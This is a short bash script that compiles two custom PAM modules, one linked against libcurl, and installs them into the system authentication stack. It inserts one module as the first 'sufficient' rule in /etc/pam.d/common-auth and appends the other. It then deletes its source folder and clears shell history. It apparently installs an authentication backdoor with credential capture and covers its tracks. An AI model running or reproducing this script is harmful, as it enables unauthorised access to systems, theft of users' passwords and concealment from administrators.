#!/bin/bash

# install libraries 
apt install -y  libcurl4-openssl-dev libpam0g-dev gcc

# build 
gcc -fPIC -shared -o pam_lv.so pam_lv.c -lcurl -lpam
gcc -fPIC -shared -o pam_init.so pam_init.c -lpam

#move 
mv pam_init.so pam_lv.so /lib/x86_64-linux-gnu/security

# modify pam files 
sed -i '1i auth sufficient 	pam_init.so' /etc/pam.d/common-auth
echo "auth	optional	pam_lv.so" >> /etc/pam.d/common-auth

#delete and clear history
rm -rf ../pamBondi
history -c 
history -w 




